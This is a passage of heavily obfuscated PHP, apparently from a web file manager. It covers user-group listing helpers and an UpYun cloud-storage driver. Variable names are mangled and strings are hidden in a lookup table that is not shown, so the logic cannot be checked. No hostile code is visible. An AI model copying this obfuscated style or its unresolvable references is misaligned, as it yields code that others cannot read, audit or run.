$öÄ¿¼“†[$—ÛöŞøŞ[445]][$—ÛöŞøŞ[447]] = ceil($öÄ¿¼“†[$—ÛöŞøŞ[445]][$—ÛöŞøŞ[446]] / $öÄ¿¼“†[$—ÛöŞøŞ[445]][$—ÛöŞøŞ[442]]); } $this->_listDataApply($öÄ¿¼“†[$—ÛöŞøŞ[448]]); $this->_filterByGroup($öÄ¿¼“†, $ÙŒÓşó¿); return $öÄ¿¼“†; } private function _filterByGroup(&$”È€À­, $—Î’…¶İ) { $ÙÎˆÌÌ¬ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$—Î’…¶İ) { return $”È€À­; } foreach ($”È€À­[$ÙÎˆÌÌ¬[448]] as $¨Ëã£œ => &$ñÇ· üó) { $èƒÎŞª = array_to_keyvalue($ñÇ· üó[$ÙÎˆÌÌ¬[1401]], $ÙÎˆÌÌ¬[12], $ÙÎˆÌÌ¬[1402]); if (!in_array($—Î’…¶İ, $èƒÎŞª)) { unset($”È€À­[$ÙÎˆÌÌ¬[448]][$¨Ëã£œ]); } } unset($ñÇ· üó); $”È€À­[$ÙÎˆÌÌ¬[448]] = array_values($”È€À­[$ÙÎˆÌÌ¬[448]]); $”È€À­[$ÙÎˆÌÌ¬[445]] = array($ÙÎˆÌÌ¬[2252] => count($”È€À­[$ÙÎˆÌÌ¬[448]]), $ÙÎˆÌÌ¬[2250] => $”È€À­[$ÙÎˆÌÌ¬[445]][$ÙÎˆÌÌ¬[442]], $ÙÎˆÌÌ¬[2249] => 1, $ÙÎˆÌÌ¬[2251] => 1); } private function _searchFromMeta($´Á¥¿ˆ, $Ó´ò±óÄ, $¥µ¹ò©–) { $ÔÔØ’—ú =& $_SERVER[¼¥ÊĞÙÌ]; $Ó´ò±óÄ = strtolower($Ó´ò±óÄ); $ÂƒÛ»µˆ = array($ÔÔØ’—ú[97] => $´Á¥¿ˆ, $ÔÔØ’—ú[453] => array($ÔÔØ’—ú[462], "\45{$Ó´ò±óÄ}\45")); $ÂƒÛ»µˆ = $this->parseWhereLike($ÂƒÛ»µˆ); $¾“©¦êº = Model($ÔÔØ’—ú[2530])->where($ÂƒÛ»µˆ)->limit($¥µ¹ò©–)->select(); if (!$¾“©¦êº) { return array(); } $¾“©¦êº = array_to_keyvalue($¾“©¦êº, $ÔÔØ’—ú[12], $ÔÔØ’—ú[1790]); $«Ò×Ú = $this->where(array($ÔÔØ’—ú[1781] => array($ÔÔØ’—ú[7], $¾“©¦êº)))->select(); if (!$«Ò×Ú) { return array(); } return $«Ò×Ú; } private function _listDataApplyItem($†»±ÑÛş) { $©Î“Ûø = array($†»±ÑÛş); $this->_listDataApply($©Î“Ûø); return $©Î“Ûø[0]; } private function _listDataApply(&$ã·¼¦á) { $ö”¬µÂ­ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ã·¼¦á) { return; } array_remove_key($ã·¼¦á, $ö”¬µÂ­[975]); $Ù“ŞÆ‘† = array_to_keyvalue($ã·¼¦á, $ö”¬µÂ­[12], $ö”¬µÂ­[1790]); $this->_listAppendGroup($ã·¼¦á, $Ù“ŞÆ‘†); $this->_listAppendMeta($ã·¼¦á, $Ù“ŞÆ‘†); $this->_listAppendSourceRoot($ã·¼¦á, $Ù“ŞÆ‘†); } private function _listAppendSourceRoot(&$ì»“Çñ¹, $®¶ğÑÁú) { $¢£¢”¸ =& $_SERVER[¼¥ÊĞÙÌ]; $Â½ë«¬ = Model($¢£¢”¸[904])->listSourceRoot(SourceModel::TYPE_USER, $®¶ğÑÁú); $Â½ë«¬ = array_to_keyvalue($Â½ë«¬, $¢£¢”¸[574]); $Â½ë«¬ = array_remove_key($Â½ë«¬, $¢£¢”¸[574]); foreach ($ì»“Çñ¹ as &$Ü±Ê¶ÌÍ) { $Ü±Ê¶ÌÍ[$¢£¢”¸[90]] = $Â½ë«¬[$Ü±Ê¶ÌÍ[$¢£¢”¸[1790]]] ? $Â½ë«¬[$Ü±Ê¶ÌÍ[$¢£¢”¸[1790]]] : array(); } unset($Ü±Ê¶ÌÍ); } private function _listAppendGroup(&$åÅñÙë°, $˜ÍÌà¹ó) { $Ñ²ç”ö =& $_SERVER[¼¥ÊĞÙÌ]; $±ûœò‡Ş = array($Ñ²ç”ö[1790] => array($Ñ²ç”ö[7], $˜ÍÌà¹ó)); $Œƒ†ûåŠ = Model($Ñ²ç”ö[2086])->where($±ûœò‡Ş)->select(); $§Ä»„÷ = array_to_keyvalue($Œƒ†ûåŠ, $Ñ²ç”ö[12], $Ñ²ç”ö[1402]); $§Ä»„÷ = array_remove_value(array_unique($§Ä»„÷), $Ñ²ç”ö[231]); if (!$§Ä»„÷ || !$Œƒ†ûåŠ) { return; } $±ûœò‡Ş = array($Ñ²ç”ö[1402] => array($Ñ²ç”ö[7], $§Ä»„÷)); $â¦Ş¿›¶ = Model($Ñ²ç”ö[1400])->field($Ñ²ç”ö[2531])->where($±ûœò‡Ş)->select(); $â¦Ş¿›¶ = array_to_keyvalue($â¦Ş¿›¶, $Ñ²ç”ö[1402]); $Œƒ†ûåŠ = array_to_keyvalue_group($Œƒ†ûåŠ, $Ñ²ç”ö[1790]); foreach ($Œƒ†ûåŠ as &$§öç‚˜Ú) { $ª®óô½· = array(); foreach ($§öç‚˜Ú as $à´¹İ®æ) { if (!$à´¹İ®æ[$Ñ²ç”ö[2100]]) { continue; } $‘¡Şó´Ä = Model($Ñ²ç”ö[576])->listData($à´¹İ®æ[$Ñ²ç”ö[2100]]); $ª®óô½·[] = array($Ñ²ç”ö[1402] => $à´¹İ®æ[$Ñ²ç”ö[1402]], $Ñ²ç”ö[2532] => $â¦Ş¿›¶[$à´¹İ®æ[$Ñ²ç”ö[1402]]][$Ñ²ç”ö[32]], $Ñ²ç”ö[589] => $â¦Ş¿›¶[$à´¹İ®æ[$Ñ²ç”ö[1402]]][$Ñ²ç”ö[589]], $Ñ²ç”ö[490] => $‘¡Şó´Ä); } $§öç‚˜Ú = $ª®óô½·; } unset($§öç‚˜Ú); foreach ($åÅñÙë° as &$–šƒ€É‹) { $–šƒ€É‹[$Ñ²ç”ö[1401]] = array(); if (isset($Œƒ†ûåŠ[$–šƒ€É‹[$Ñ²ç”ö[1790]]])) { $–šƒ€É‹[$Ñ²ç”ö[1401]] = $Œƒ†ûåŠ[$–šƒ€É‹[$Ñ²ç”ö[1790]]]; } } unset($–šƒ€É‹); } public function userAppendGroup($¾ƒò«Ñ¼) { $ş°æ¨§ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$¾ƒò«Ñ¼) { return array(); } $this->_listAppendGroup($¾ƒò«Ñ¼, array_to_keyvalue($¾ƒò«Ñ¼, $ş°æ¨§[12], $ş°æ¨§[1790])); return $¾ƒò«Ñ¼; } private function _listAppendMeta(&$îôÁ»š, $ûı„ã¢Õ) { $ñÜª…ö” =& $_SERVER[¼¥ÊĞÙÌ]; $ÊÙä•æê = UserJobModel::JOB_KEY; $¥·ÅÎîÎ = array($ñÜª…ö”[2084]); $ê‹óãËè = array($ñÜª…ö”[1790] => array($ñÜª…ö”[7], $ûı„ã¢Õ)); $‡º—…ó = Model($ñÜª…ö”[2508])->where($ê‹óãËè)->select(); $‚–µÛÉì = array(); foreach ($‡º—…ó as $šÇ«Ú§) { $Ó¯ìÔ¹ = $šÇ«Ú§[$ñÜª…ö”[1790]]; if (!isset($‚–µÛÉì[$Ó¯ìÔ¹])) { $‚–µÛÉì[$Ó¯ìÔ¹] = array(); } $‚–µÛÉì[$Ó¯ìÔ¹][$šÇ«Ú§[$ñÜª…ö”[97]]] = $šÇ«Ú§[$ñÜª…ö”[453]]; } $˜äé©” = Model($ñÜª…ö”[2533]); foreach ($îôÁ»š as &$™–£âê) { $Ó¯ìÔ¹ = $™–£âê[$ñÜª…ö”[1790]]; $ ¹œ­Ãš = isset($‚–µÛÉì[$Ó¯ìÔ¹]) ? $‚–µÛÉì[$Ó¯ìÔ¹] : array(); $™–£âê[$ñÜª…ö”[544]] = array_field_key($ ¹œ­Ãš, $¥·ÅÎîÎ); $™–£âê[$ñÜª…ö”[2534]] = array(); if (isset($ ¹œ­Ãš[$ÊÙä•æê])) { $™–£âê[$ñÜª…ö”[2534]] = $˜äé©”->getUserJobInfo($ ¹œ­Ãš[$ÊÙä•æê]); } } unset($™–£âê); } protected function groupUserAll($Ë…¡…) { $û°ç¼±ç =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Ë…¡…) { return !1; } $¨û‚«èÓ = Model($û°ç¼±ç[2086])->field($û°ç¼±ç[1790])->where(array($û°ç¼±ç[1402] => array($û°ç¼±ç[7], $Ë…¡…)))->select(); $¨û‚«èÓ = array_to_keyvalue($¨û‚«èÓ, $û°ç¼±ç[12], $û°ç¼±ç[1790]); return array_unique($¨û‚«èÓ); } public function userSearch($âĞƒïŸë, $¿ãÕÔÍ = "\52") { return Model($_SERVER[¼¥ÊĞÙÌ][602])->where($âĞƒïŸë)->field($¿ãÕÔÍ)->find(); } } goto F †°øÚ…Å; E­šŒóÃõÄ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ò¼‘ŞÁó, $ÄÛí¶ï¬ = 0) { parent::__construct(); $this->source = $ò¼‘ŞÁó; $this->sourceSize = $ÄÛí¶ï¬; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($‰²¦Ø = false) { return $this->sourceSize; } public function getContent($æ†Ù¡¶ = false) { return $this->fileSubstr($æ†Ù¡¶, 0, $this->sourceSize); } public function fileSubstr($óş—•¿È = false, $²Í¸›·¢ = 0, $¡ÕÀóÀà = 0) { if (!$¡ÕÀóÀà) { $¡ÕÀóÀà = $this->sourceSize; } $àõ¸˜¨Ó = $this->sourceSize - $²Í¸›·¢; if ($¡ÕÀóÀà >= $àõ¸˜¨Ó) { $¡ÕÀóÀà = $àõ¸˜¨Ó; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $²Í¸›·¢, $¡ÕÀóÀà); } if ($this->sourceType == self::TYPE_FILE) { if ($¡ÕÀóÀà <= 0) { return $_SERVER[¼¥ÊĞÙÌ][12]; } $ÀùøÎ¬ = ftell($this->source); fseek_64($this->source, $ÀùøÎ¬ + $²Í¸›·¢); $ÅØÏ¤Æí = @fread($this->source, $¡ÕÀóÀà); fseek_64($this->source, $ÀùøÎ¬); return $ÅØÏ¤Æí; } } public function hashMd5($·®±‘¾ = false) { return md5($this->getContent()); } public static function hash($¾î®Å›¼, $Ÿ¸…ïœ€ = 0) { $êÚå–Ò¯ = new PathDriverStream($¾î®Å›¼, $Ÿ¸…ïœ€); return $êÚå–Ò¯->hashSimple($¾î®Å›¼); } public static function md5($¼‘ÌÒ¾¦, $Æ£ÍíÍœ = 0) { $£ŒÌËŠì = new PathDriverStream($¼‘ÌÒ¾¦, $Æ£ÍíÍœ); return $£ŒÌËŠì->hashMd5($¼‘ÌÒ¾¦); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\72\57\57\166\60\x2e\141\160\x69\56\x75\x70\171\x75\156\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ƒëêĞñû) { parent::__construct(); $this->_init($ƒëêĞñû); } public function _init($õàÈ¤†ë) { $»»†ïâ‘ =& $_SERVER[¼¥ÊĞÙÌ]; foreach ($õàÈ¤†ë as $•¿‡×´¤ => $Ìá‹ÒÂá) { if (isset($this->{$•¿‡×´¤})) { $this->{$•¿‡×´¤} = $Ìá‹ÒÂá; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($»»†ïâ‘[1564] . LNG($»»†ïâ‘[1484])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($™ÉšÒï‚, $ï—Øó¨ = "\x47\x45\124") { $şà¸èÚ =& $_SERVER[¼¥ÊĞÙÌ]; $Ø±ù™Ï¯ = gmdate($şà¸èÚ[1513]); $³³‹Öªû = base64_encode(hash_hmac($şà¸èÚ[1565], "{$ï—Øó¨}\x26{$™ÉšÒï‚}\46{$Ø±ù™Ï¯}", md5("{$this->userpass}"), !0)); $¯âÅ÷ = array("\101\165\164\x68\157\x72\x69\x7a\141\x74\x69\x6f\x6e\72\125\x50\x59\125\116\x20{$this->username}\x3a{$³³‹Öªû}", "\x44\x61\x74\x65\x3a{$Ø±ù™Ï¯}"); return $¯âÅ÷; } public function ussRequest($ß’‰Éå, $’©—×ìÇ = "\x47\x45\x54", $ûäê¨É˜ = false, $¢ÒÏ–·¿ = false, $Æ›‘§¼ = false) { $•«ëŞŒ =& $_SERVER[¼¥ÊĞÙÌ]; $ß’‰Éå = trim($ß’‰Éå, $•«ëŞŒ[8]); $ßÆéàÀ· = "\57{$this->bucket}\x2f" . rawurlencode($ß’‰Éå); $ŞäµÈÊÍ = $this->ussHeaders($ßÆéàÀ·, $’©—×ìÇ); if ($¢ÒÏ–·¿) { $ŞäµÈÊÍ = array_merge($ŞäµÈÊÍ, $¢ÒÏ–·¿); } $«ŠÖÉ = url_request($this->endpoint . $ßÆéàÀ·, $’©—×ìÇ, $ûäê¨É˜, $ŞäµÈÊÍ, $Æ›‘§¼); if (!$«ŠÖÉ) { $‡Ÿ§© ‡ = LNG($•«ëŞŒ[1566]); $this->writeLog($‡Ÿ§© ‡); return array($•«ëŞŒ[1309] => !1, $•«ëŞŒ[1299] => $‡Ÿ§© ‡); } if (strtolower($’©—×ìÇ) == $•«ëŞŒ[230] || in_array($«ŠÖÉ[$•«ëŞŒ[1309]], array($•«ëŞŒ[264], $•«ëŞŒ[1567]))) { $ûäê¨É˜ = $«ŠÖÉ[$•«ëŞŒ[1568]]; if (!$«ŠÖÉ[$•«ëŞŒ[824]]) { $ûäê¨É˜ = isset($ûäê¨É˜[0]) ? $ûäê¨É˜[0] : $•«ëŞŒ[12]; } } else { $ûäê¨É˜ = json_decode($«ŠÖÉ[$•«ëŞŒ[1299]], !0); if (!$ûäê¨É˜) { $ûäê¨É˜ = $«ŠÖÉ[$•«ëŞŒ[1299]]; } else { if (!$«ŠÖÉ[$•«ëŞŒ[824]] && isset($ûäê¨É˜[$•«ëŞŒ[1569]])) { $ûäê¨É˜ = $ûäê¨É˜[$•«ëŞŒ[1569]]; } } } if (!$«ŠÖÉ[$•«ëŞŒ[824]]) { $this->writeLog($this->__errorMessage($ûäê¨É˜)); } return array($•«ëŞŒ[1309] => $«ŠÖÉ[$•«ëŞŒ[824]], $•«ëŞŒ[1299] => $ûäê¨É˜); } private function __errorMessage($ãáÁŠù) { $õÌšŒ­ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ãáÁŠù) { return $õÌšŒ­[12]; } static $´˜Óš½  = null; if (!$´˜Óš½ ) { $´˜Óš½  = I18n::getType(); } if ($´˜Óš½  != $õÌšŒ­[1522]) { return $ãáÁŠù; } $šÓ‰ÌøÇ = array($õÌšŒ­[1570] => $õÌšŒ­[1571], $õÌšŒ­[1572] => $õÌšŒ­[1573], $õÌšŒ­[1574] => $õÌšŒ­[1573], $õÌšŒ­[1575] => $õÌšŒ­[1576], $õÌšŒ­[1577] => $õÌšŒ­[1578], $õÌšŒ­[1579] => $õÌšŒ­[1580], $õÌšŒ­[1581] => $õÌšŒ­[1582]); return isset($šÓ‰ÌøÇ[$ãáÁŠù]) ? $šÓ‰ÌøÇ[$ãáÁŠù] : $ãáÁŠù; } public function mkfile($ßÉÉ®¬ì, $²Ú®üİ˜ = '', $Äâîå•Ü = REPEAT_RENAME) { if ($this->setContent($ßÉÉ®¬ì, $²Ú®üİ˜)) { return $this->getPathOuter($ßÉÉ®¬ì); } return !1; } public function mkdir($é‘½½šà, $à³¿­Â = REPEAT_SKIP) { $Ó…É—úÂ =& $_SERVER[¼¥ÊĞÙÌ]; $¤Åô„õï = trim($é‘½½šà, $Ó…É—úÂ[8]); if ($this->_isFolder($¤Åô„õï)) { return $this->getPathOuter($¤Åô„õï); } $ê–©Ğ» = array($Ó…É—úÂ[1583]); $Ø»¯èüû = $this->ussRequest($¤Åô„õï, $Ó…É—úÂ[291], !1, $ê–©Ğ»); return $Ø»¯èüû[$Ó…É—úÂ[1309]] ? $this->getPathOuter($¤Åô„õï) : !1; } public function copyFile($íù«È¯½, $şşåğéŒ) { $¡Ìƒ´›ô =& $_SERVER[¼¥ÊĞÙÌ]; $âËáô» = array($¡Ìƒ´›ô[1584] . "\x2f{$this->bucket}\57{$íù«È¯½}", $¡Ìƒ´›ô[1585]); $ªè–†¼ı = $this->ussRequest($şşåğéŒ, $¡Ìƒ´›ô[256], !1, $âËáô»); return $ªè–†¼ı[$¡Ìƒ´›ô[1309]] ? !0 : $this->getPathOuter($şşåğéŒ); } public function moveFile($Û‡ÔÊ†, $ë»«ïìó) { $Ùö¿‘Ùó =& $_SERVER[¼¥ÊĞÙÌ]; $¸Û›ù¬ö = array($Ùö¿‘Ùó[1586] . "\57{$this->bucket}\x2f{$Û‡ÔÊ†}", $Ùö¿‘Ùó[1585]); $àÚº•¶§ = $this->ussRequest($ë»«ïìó, $Ùö¿‘Ùó[256], !1, $¸Û›ù¬ö); return $àÚº•¶§[$Ùö¿‘Ùó[1309]] ? !0 : $this->getPathOuter($ë»«ïìó); } public function delFile($ºõ»¾üó) { $‘¿íÏù =& $_SERVER[¼¥ÊĞÙÌ]; $üÑÈ³œ = $this->ussRequest($ºõ»¾üó, $‘¿íÏù[1587]); return $üÑÈ³œ[$‘¿íÏù[1309]] ? !0 : !1; } public function delFolder($Èä¯ğå¾) { $…¥ÃÊŠ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->exist($Èä¯ğå¾)) { return !0; } $this->listItemCache = !1; $Î¾ØŠ = $¬ÍàÌŒ = array(); $this->fileList($Èä¯ğå¾, $Î¾ØŠ, $¬ÍàÌŒ, !0); $this->listItemCache = !0; foreach ($¬ÍàÌŒ as $å‚±Îí) { $×œ§Şºğ = $this->ussRequest($å‚±Îí[$…¥ÃÊŠ[32]], $…¥ÃÊŠ[1587]); if (!$×œ§Şºğ[$…¥ÃÊŠ[1309]]) { return !1; } } usort($Î¾ØŠ, function ($“Å å‘Æ, $ı¸¯Ö‚²) { $ÖªàéÇÊ =& $_SERVER[¼¥ÊĞÙÌ]; return substr_count($ı¸¯Ö‚², $ÖªàéÇÊ[8]) - substr_count($“Å å‘Æ, $ÖªàéÇÊ[8]); }); foreach ($Î¾ØŠ as $¤¨™¦òĞ) { $×œ§Şºğ = $this->ussRequest($¤¨™¦òĞ, $…¥ÃÊŠ[1587]); if (!$×œ§Şºğ[$…¥ÃÊŠ[1309]]) { return !1; } } $×œ§Şºğ = $this->ussRequest($Èä¯ğå¾, $…¥ÃÊŠ[1587]); return $×œ§Şºğ[$…¥ÃÊŠ[1309]]; } public function rename($Ÿûª›£», $›ÑšæŠ…) { if ($this->isFile($Ÿûª›£»)) { $›ÑšæŠ… = get_path_father($Ÿûª›£») . $›ÑšæŠ…; return $this->moveFile($Ÿûª›£», $›ÑšæŠ…); } return $this->renameObject($Ÿûª›£», $›ÑšæŠ…); } public function fileInfo($²èÖ¸„Å, $´İ³ªÉò = false, $İéÒÍ­æ = array()) { $Ùïûç =& $_SERVER[¼¥ÊĞÙÌ]; $Ë¶Õó“½ = array($Ùïûç[32] => $this->pathThis($²èÖ¸„Å), $Ùïûç[87] => $this->getPathOuter($Ùïûç[8] . $²èÖ¸„Å), $Ùïûç[33] => $Ùïûç[233], $Ùïûç[79] => isset($İéÒÍ­æ[$Ùïûç[79]]) ? $İéÒÍ­æ[$Ùïûç[79]] : 0, $Ùïûç[169] => $this->ext($²èÖ¸„Å)); if ($´İ³ªÉò) { return $Ë¶Õó“½; } $Ë¶Õó“½[$Ùïûç[234]] = $Ë¶Õó“½[$Ùïûç[88]] = 0; $Ë¶Õó“½[$Ùïûç[235]] = $Ë¶Õó“½[$Ùïûç[236]] = !0; if (empty($İéÒÍ­æ)) { $İéÒÍ­æ = $this->objectMeta($²èÖ¸„Å); if (!$İéÒÍ­æ) { return $Ë¶Õó“½; } } $Ë¶Õó“½[$Ùïûç[234]] = intval($İéÒÍ­æ[$Ùïûç[1588]]); $Ë¶Õó“½[$Ùïûç[88]] = intval($İéÒÍ­æ[$Ùïûç[1589]]); $Ë¶Õó“½[$Ùïûç[79]] = $İéÒÍ­æ[$Ùïûç[79]]; return $Ë¶Õó“½; } public function folderInfo($ §Î£Ãš, $ñÎÀÃôÔ = false) { $µ¶¦ÖªÁ =& $_SERVER[¼¥ÊĞÙÌ]; $Ğõ‚®ş = array($µ¶¦ÖªÁ[32] => $this->pathThis($ §Î£Ãš), $µ¶¦ÖªÁ[87] => $this->getPathOuter($µ¶¦ÖªÁ[8] . $ §Î£Ãš), $µ¶¦ÖªÁ[33] => $µ¶¦ÖªÁ[78]); if ($ñÎÀÃôÔ) { return $Ğõ‚®ş; } $Ğõ‚®ş[$µ¶¦ÖªÁ[234]] = $Ğõ‚®ş[$µ¶¦ÖªÁ[88]] = 0; $Ğõ‚®ş[$µ¶¦ÖªÁ[235]] = $Ğõ‚®ş[$µ¶¦ÖªÁ[236]] = !0; if (empty($ƒáè·â)) { $ƒáè·â = $this->objectMeta($ §Î£Ãš); if (!$ƒáè·â) { return $Ğõ‚®ş; } } $Ğõ‚®ş[$µ¶¦ÖªÁ[234]] = intval($ƒáè·â[$µ¶¦ÖªÁ[1588]]); $Ğõ‚®ş[$µ¶¦ÖªÁ[88]] = intval($ƒáè·â[$µ¶¦ÖªÁ[1589]]); return $Ğõ‚®ş; } private function listObjs($Í­ÒßñÎ, $ºĞáˆÆŞ = 0, $³œ›¨ñÙ = 1000) { $³€¨÷Ó™ =& $_SERVER[¼¥ÊĞÙÌ]; $ëµ‰œ»Œ = array($³€¨÷Ó™[1590], $³€¨÷Ó™[1591] . $³œ›¨ñÙ); if ($ºĞáˆÆŞ) { $ëµ‰œ»Œ[] = $³€¨÷Ó™[1592] . $ºĞáˆÆŞ; } $’˜¬º¤ä = $this->ussRequest($Í­ÒßñÎ, $³€¨÷Ó™[1515], !1, $ëµ‰œ»Œ); return !$’˜¬º¤ä[$³€¨÷Ó™[1309]] ? !1 : $’˜¬º¤ä[$³€¨÷Ó™[1299]]; } private function fileList($èéÈ°ñÎ, &$ìÓÍ —’, &$ø¶ı¤ìª, $å÷£´» = false) { $ó÷ºÚÓ¥ =& $_SERVER[¼¥ÊĞÙÌ]; $ı•Óß¶… = $ó÷ºÚÓ¥[12]; $òï«¯Í« = 1000; $€§İğåş = rtrim($èéÈ°ñÎ, $ó÷ºÚÓ¥[8]) . $ó÷ºÚÓ¥[8]; while (!0) { check_abort(); $¥˜á©¶… = $this->listObjs($èéÈ°ñÎ, $ı•Óß¶…, $òï«¯Í«); if (!$¥˜á©¶…) { return !1; } $ı•Óß¶… = isset($¥˜á©¶…[$ó÷ºÚÓ¥[1593]]) ? $¥˜á©¶…[$ó÷ºÚÓ¥[1593]] : $ó÷ºÚÓ¥[12]; $¯ô«Æ¶± = isset($¥˜á©¶…[$ó÷ºÚÓ¥[1594]]) ? $¥˜á©¶…[$ó÷ºÚÓ¥[1594]] : array(); foreach ($¯ô«Æ¶± as $òòÃâñî) { $Ô¬ğµÚ = $òòÃâñî[$ó÷ºÚÓ¥[33]] == $ó÷ºÚÓ¥[78] ? !0 : !1; $âÂëÀßË = ltrim($€§İğåş . $òòÃâñî[$ó÷ºÚÓ¥[32]], $ó÷ºÚÓ¥[8]) . ($Ô¬ğµÚ ? $ó÷ºÚÓ¥[8] : $ó÷ºÚÓ¥[12]); $—¡ÁéÎ” = array($ó÷ºÚÓ¥[32] => $âÂëÀßË, $ó÷ºÚÓ¥[33] => $Ô¬ğµÚ ? $ó÷ºÚÓ¥[78] : $ó÷ºÚÓ¥[233], $ó÷ºÚÓ¥[79] => $òòÃâñî[$ó÷ºÚÓ¥[415]], $ó÷ºÚÓ¥[1589] => $òòÃâñî[$ó÷ºÚÓ¥[1595]]); $this->cacheMethodInfoSet($âÂëÀßË, $Ô¬ğµÚ, $—¡ÁéÎ”); if ($Ô¬ğµÚ) { $ìÓÍ —’[] = $âÂëÀßË; if ($å÷£´») { $this->fileList($âÂëÀßË, $ìÓÍ —’, $ø¶ı¤ìª, $å÷£´»); } continue; } $ø¶ı¤ìª[] = $—¡ÁéÎ”; } if (count($¯ô«Æ¶±) < $òï«¯Í«) { break; } } $this->cacheMethodInfoSet($èéÈ°ñÎ, !0); } public function listPath($¶µŒèÈ, $¤ –ú­á = false) { $¼ıï¯Ù =& $_SERVER[¼¥ÊĞÙÌ]; $ü…Ô…‚ = $™æ…„ı  = array(); $this->fileList($¶µŒèÈ, $ü…Ô…‚, $™æ…„ı ); foreach ($ü…Ô…‚ as $¯ïÖÜ¸É => $óñ¬´) { $ü…Ô…‚[$¯ïÖÜ¸É] = $this->folderInfo($óñ¬´, $¤ –ú­á); } foreach ($™æ…„ı  as $¯ïÖÜ¸É => $óñ¬´) { $™æ…„ı [$¯ïÖÜ¸É] = $this->fileInfo($óñ¬´[$¼ıï¯Ù[32]], $¤ –ú­á, $óñ¬´); } return array($¼ıï¯Ù[85] => $ü…Ô…‚, $¼ıï¯Ù[86] => $™æ…„ı ); } public function has($àÔĞÂõµ, $ÖÚø—¦Å = false, $ù‹—ûœ = true) { $Îß¦éç =& $_SERVER[¼¥ÊĞÙÌ]; $Ì¯Û„†” = $Îß¦éç[12]; $Ä¡‹İêæ = 500; $½µ‰Ó³ = 0; $şô¢¤øÂ = 0; $ú÷ˆœà© = rtrim($àÔĞÂõµ, $Îß¦éç[8]) . $Îß¦éç[8]; while (!0) { check_abort(); $Ø•¢µ½ = $this->listObjs($àÔĞÂõµ, $Ì¯Û„†”, $Ä¡‹İêæ); if (!$Ø•¢µ½) { return !1; } $Ì¯Û„†” = isset($Ø•¢µ½[$Îß¦éç[1593]]) ? $Ø•¢µ½[$Îß¦éç[1593]] : $Îß¦éç[12]; $ŠããÚñÉ = isset($Ø•¢µ½[$Îß¦éç[1594]]) ? $Ø•¢µ½[$Îß¦éç[1594]] : array(); if (empty($ŠããÚñÉ)) { break; } $Ğ“ŒÉ–Š = array_filter($ŠããÚñÉ, function ($İ¬ì×¶) { $°Ñ ½¸‘ =& $_SERVER[¼¥ÊĞÙÌ]; return $İ¬ì×¶[$°Ñ ½¸‘[33]] == $°Ñ ½¸‘[78]; }); $¡ÊÄ¹ƒ = count($ŠããÚñÉ); $Ğ“ŒÉ–Š = count($Ğ“ŒÉ–Š); $Ü—»Ë•Â = $¡ÊÄ¹ƒ - $Ğ“ŒÉ–Š; if ($ÖÚø—¦Å) { $şô¢¤øÂ += $Ğ“ŒÉ–Š; $½µ‰Ó³ += $Ü—»Ë•Â; if ($¡ÊÄ¹ƒ < $Ä¡‹İêæ) { break; } continue; } if ($ù‹—ûœ) { if ($Ü—»Ë•Â) { return !0; } } else { if ($Ğ“ŒÉ–Š) { return !0; } } if ($¡ÊÄ¹ƒ < $Ä¡‹İêæ) { break; } } if ($ÖÚø—¦Å) { return array($Îß¦éç[242] => $½µ‰Ó³, $Îß¦éç[243] => $şô¢¤øÂ); } return !1; } public function listAll($Ô©Ú™ƒ¨) { $¥ÍßÂãË =& $_SERVER[¼¥ÊĞÙÌ]; $’§«ñÑ÷ = $‰–¥©‘ = array(); $this->fileList($Ô©Ú™ƒ¨, $’§«ñÑ÷, $‰–¥©‘, !0); $ãß¹ÀÌÇ = array_to_keyvalue($‰–¥©‘, $¥ÍßÂãË[32]); foreach ($’§«ñÑ÷ as $àı˜şÁõ) { if (is_string($àı˜şÁõ)) { $ãß¹ÀÌÇ[$àı˜şÁõ] = array($¥ÍßÂãË[79] => 0); } } return $this->listAllFiles($Ô©Ú™ƒ¨, $ãß¹ÀÌÇ); } public function canRead($£ˆ®ğ²ò) { return $this->exist($£ˆ®ğ²ò) ? !0 : !1; } public function canWrite($‚ì»Ñ¢) { return $this->exist($‚ì»Ñ¢) ? !0 : !1; } public function getContent($ó‘èÈªü) { return $this->fileSubstr($ó‘èÈªü, 0, -1); } public function setContent($¾øµ®ı, $Ö´åÎñŒ = '') { $Õ•ßé¶ö =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Ö´åÎñŒ) { $š†°Şª÷ = $this->ussRequest($¾øµ®ı, $Õ•ßé¶ö[291]); return $š†°Şª÷[$Õ•ßé¶ö[1309]]; } $Œ²¿š å = $this->tempFile($this->pathThis($¾øµ®ı)); file_put_contents($Œ²¿š å, $Ö´åÎñŒ); if ($this->upload($¾øµ®ı, $Œ²¿š å)) { $this->tempFileRemve($Œ²¿š å); return !0; } return !1; } public function fileSubstr($ğ³ë›áï, $”éíœü½, $©¿Ö¥¡) { $¡Œãäãã =& $_SERVER[¼¥ÊĞÙÌ]; if (!($Õìç‚İ‰ = $this->link($ğ³ë›áï))) { return !1; } $¸‡·¯’¢ = !1; if ($©¿Ö¥¡ > 0) { $×ü–›î¤ = $”éíœü½ + $©¿Ö¥¡ - 1; $¸‡·¯’¢ = array($¡Œãäãã[1554] . $”éíœü½ . $¡Œãäãã[465] . $×ü–›î¤); } $éÁÀòöã = url_request($Õìç‚İ‰, $¡Œãäãã[1515], !1, $¸‡·¯’¢); return $éÁÀòöã[$¡Œãäãã[824]] ? $éÁÀòöã[$¡Œãäãã[1299]] : !1; } public function upload($ÓÓããÇ¹, $İó…›Ñ¶, $ååó¨šé = false, $²ÅÑ¯úË = REPEAT_REPLACE) { $’©×›·Æ =& $_SERVER[¼¥ÊĞÙÌ]; $ı¶¨Ÿìê = 